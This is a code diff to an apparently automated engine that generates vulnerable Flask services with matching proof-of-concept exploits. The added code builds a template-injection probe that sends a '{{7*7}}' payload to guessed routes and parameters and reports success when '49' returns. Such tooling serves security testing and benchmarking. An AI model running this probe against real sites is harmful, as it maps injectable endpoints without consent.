@@ -25,6 +25,7 @@ from common.deps.stdlib import load_stdlib_spec
 from common.logging import get_logger
 from common.prompts import build_guard_autofix_prompt, build_synthesis_prompt
 from common.paths import ensure_dir
+from common.roles import normalize_role, role_matches
 from common.vuln_semantics import evaluate_manifest_semantics, semantic_error_summary
 from evals.static_signatures import analyze_static_signals
 from common.rules import RuleSpec, load_rule, load_rulespec
@@ -304,6 +305,7 @@ class SynthesisEngine:
             manifest = self._parse_manifest(raw, idx)
             manifest = self._apply_poc_template(manifest, poc_template)
             manifest = self._ensure_fallback_poc(manifest, poc_template)
+            manifest = self._stabilize_pattern_specific_artifacts(manifest, poc_template)
             manifest = self._inject_user_deps(manifest)
             declared = self._extract_declared_dependencies(manifest)
             required_static = self._detect_required_dependencies(manifest)
@@ -499,11 +501,150 @@ class SynthesisEngine:
         )
         return manifest
 
+    def _stabilize_pattern_specific_artifacts(self, manifest: Dict[str, Any], template: Dict[str, Any]) -> Dict[str, Any]:
+        if not self._is_template_injection_family():
+            return manifest
+        files = manifest.get("files")
+        if not isinstance(files, list):
+            manifest["files"] = files = []
+
+        poc = manifest.get("poc")
+        if not isinstance(poc, dict):
+            poc = {}
+            manifest["poc"] = poc
+        success_signature = str(template.get("success_signature") or poc.get("success_signature") or "Exploit SUCCESS").strip() or "Exploit SUCCESS"
+        flag_token = str(template.get("flag_token") or poc.get("flag_token") or "").strip()
+        poc["cmd"] = "python poc.py --base-url {{base_url}}"
+        poc["success_signature"] = success_signature
+        if flag_token:
+            poc["flag_token"] = flag_token
+        else:
+            poc.pop("flag_token", None)
+        poc["notes"] = (
+            "Deterministic Template Injection PoC: tries common Flask endpoints and name-like parameters with "
+            "payload containing '{{7*7}}', then prints the required success signature and optional flag token on success."
+        )
+        manifest["poc"] = poc
+
+        content = self._build_template_injection_poc_content(manifest, success_signature, flag_token)
+        poc_entry = None
+        for entry in files:
+            if not isinstance(entry, dict):
+                continue
+            role = normalize_role(entry.get("role"))
+            path = str(entry.get("path") or "").strip()
+            if role_matches(role, "poc_entry") or Path(path).name.lower().startswith("poc."):
+                poc_entry = entry
+                break
+        if poc_entry is None:
+            files.append(
+                {
+                    "path": "poc.py",
+                    "role": "poc_entry",
+                    "description": "Deterministic Template Injection PoC",
+                    "content": content,
+                }
+            )
+        else:
+            poc_entry["path"] = str(poc_entry.get("path") or "poc.py").strip() or "poc.py"
+            poc_entry["role"] = "poc_entry"
+            poc_entry["content"] = content
+        return manifest
+
+    def _is_template_injection_family(self) -> bool:
+        vuln = str((self._requirement or {}).get("vuln_id") or "").strip().lower()
+        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
+        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
+        return (
+            "template-injection" in pattern_id
+            or "ssti" in pattern_id
+            or "template injection" in label
+            or "ssti" in label
+            or vuln == "name-template-injection"
+        )
+
+    def _template_injection_route_candidates(self, manifest: Dict[str, Any]) -> List[str]:
+        files = manifest.get("files") if isinstance(manifest, dict) else []
+        service_text = ""
+        for entry in files if isinstance(files, list) else []:
+            if not isinstance(entry, dict):
+                continue
+            role = normalize_role(entry.get("role"))
+            if role_matches(role, "service_main"):
+                service_text = str(entry.get("content") or "")
+                break
+        discovered: List[str] = []
+        for match in re.finditer(r"@app\.(?:get|post|route)\(\s*['\"](?P<path>/[^'\"]*)['\"]", service_text):
+            path = str(match.group("path") or "").strip()
+            if not path or path == "/health" or path in discovered:
+                continue
+            discovered.append(path)
+        defaults = ["/greet", "/display_name", "/hello", "/"]
+        for path in defaults:
+            if path not in discovered:
+                discovered.append(path)
+        return discovered or defaults
+
+    def _build_template_injection_poc_content(
+        self,
+        manifest: Dict[str, Any],
+        success_signature: str,
+        flag_token: str,
+    ) -> str:
+        route_candidates = self._template_injection_route_candidates(manifest)
+        payload_prefix = flag_token or "SSTI_OK"
+        default_payload = f"{payload_prefix} {{{{7*7}}}}"
+        lines = [
+            "import argparse",
+            "import sys",
+            "import requests",
+            "",
+            f"SUCCESS_SIGNATURE = {success_signature!r}",
+            f"FLAG_TOKEN = {flag_token!r}",
+            f"DEFAULT_PAYLOAD = {default_payload!r}",
+            f"ROUTE_CANDIDATES = {route_candidates!r}",
+            "PARAM_CANDIDATES = ['name', 'input', 'payload', 'template', 'value', 'q']",
+            "",
+            "def _request(method: str, url: str, param: str, payload: str):",
+            "    if method == 'GET':",
+            "        return requests.get(url, params={param: payload}, timeout=5)",
+            "    return requests.post(url, data={param: payload}, timeout=5)",
+            "",
+            "def main() -> int:",
+            "    ap = argparse.ArgumentParser()",
+            "    ap.add_argument('--base-url', default='http://127.0.0.1:5000')",
+            "    ap.add_argument('--payload', default=DEFAULT_PAYLOAD)",
+            "    args = ap.parse_args()",
+            "    base = args.base_url.rstrip('/')",
+            "    for route in ROUTE_CANDIDATES:",
+            "        url = base + route",
+            "        for param in PARAM_CANDIDATES:",
+            "            for method in ('GET', 'POST'):",
+            "                try:",
+            "                    resp = _request(method, url, param, args.payload)",
+            "                except Exception:",
+            "                    continue",
+            "                body = resp.text or ''",
+            "                if resp.status_code == 200 and '49' in body:",
+            "                    print('49')",
+            "                    print(SUCCESS_SIGNATURE)",
+            "                    if FLAG_TOKEN:",
+            "                        print(FLAG_TOKEN)",
+            "                    return 0",
+            "    print('Exploit failed: arithmetic marker not observed', file=sys.stderr)",
+            "    return 1",
+            "",
+            "if __name__ == '__main__':",
+            "    sys.exit(main())",
+            "",
+        ]
+        return "\n".join(lines)
+
     def _parse_manifest(self, raw: str, idx: int) -> Dict[str, Any]:
         try:
             manifest = json.loads(raw)
             if isinstance(manifest, dict):
-                return manifest
+                return self._normalize_manifest_roles(manifest)
         except json.JSONDecodeError:
             start = raw.find("{")
             end = raw.rfind("}")
@@ -512,11 +653,24 @@ class SynthesisEngine:
                 try:
                     manifest = json.loads(snippet)
                     if isinstance(manifest, dict):
-                        return manifest
+                        return self._normalize_manifest_roles(manifest)
                 except json.JSONDecodeError:
                     pass
         LOGGER.warning("Candidate %s emitted non-JSON manifest; using fallback.", idx)
-        return self._fallback_manifest()
+        return self._normalize_manifest_roles(self._fallback_manifest())
+
+    @staticmethod
+    def _normalize_manifest_roles(manifest: Dict[str, Any]) -> Dict[str, Any]:
+        files = manifest.get("files")
+        if not isinstance(files, list):
+            return manifest
+        for entry in files:
+            if not isinstance(entry, dict):
+                continue
+            role = normalize_role(entry.get("role"))
+            if role:
+                entry["role"] = role
+        return manifest
 
     def _fallback_manifest(self) -> Dict[str, Any]:
         """Deterministic manifest used when the LLM stub is active."""
@@ -2258,9 +2412,9 @@ class SynthesisEngine:
             for entry in files:
                 if not isinstance(entry, dict):
                     continue
-                role = str(entry.get("role") or "").strip().lower()
+                role = normalize_role(entry.get("role"))
                 entry_path = entry.get("path") or ""
-                if role == "service_main" and isinstance(entry_path, str) and entry_path:
+                if role_matches(role, "service_main") and isinstance(entry_path, str) and entry_path:
                     service_path = entry_path
                     break
             if service_path:
@@ -2277,12 +2431,12 @@ class SynthesisEngine:
         for entry in manifest.get("files", []):
             if not isinstance(entry, dict):
                 continue
-            role = str(entry.get("role") or "").strip().lower()
+            role = normalize_role(entry.get("role"))
             path = str(entry.get("path") or "").strip()
             if not path:
                 continue
             name = Path(path).name.strip().lower()
-            if role == "poc_entry" or name.startswith("poc."):
+            if role_matches(role, "poc_entry") or name.startswith("poc."):
                 content = entry.get("content")
                 if isinstance(content, str) and needle in content:
                     return True
